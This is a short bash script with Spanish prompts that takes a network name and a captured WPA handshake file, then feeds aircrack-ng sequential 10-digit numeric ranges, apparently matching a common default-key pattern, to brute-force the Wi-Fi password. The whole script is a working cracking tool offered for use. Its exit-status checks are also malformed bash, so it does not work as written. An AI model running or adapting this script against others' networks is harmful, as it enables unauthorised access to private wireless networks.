#!/bin/bash

echo "Ejecutar este script en screen"
echo -n "ingrese ESSID="
read ESSID
echo -n "ingrese archivo .cap ejemplo 0XX-01="
read capFile
echo "benchmark......"
#aircrack-ng -S

#20millones a 40 millones, 10 digitos
#seq 0042000000 0044000000 | awk '{printf "%010d\n", $0;}' | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
seq -w 00435000000 00436000000 | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
else
seq -w 0142000000 0144000000 | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
else
#8 millones a 20 millones, 10 digitos
seq 0040800000 0042000000 | awk '{printf "%010d\n", $0;}' | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
else
seq 0140800000 0142000000 | awk '{printf "%010d\n", $0;}' | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
else
#40 millones a 50 millones, 10 digitos
seq 0044000000 0045000000 | awk '{printf "%010d\n", $0;}' | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
else
seq 0144000000 0145000000 | awk '{printf "%010d\n", $0;}' | aircrack-ng -e "$ESSID" -w - caps/"$capFile".cap
if ["$?" == "0"] then exit 0
fi
fi
fi
fi
fi
fi
echo "Not found... :/"
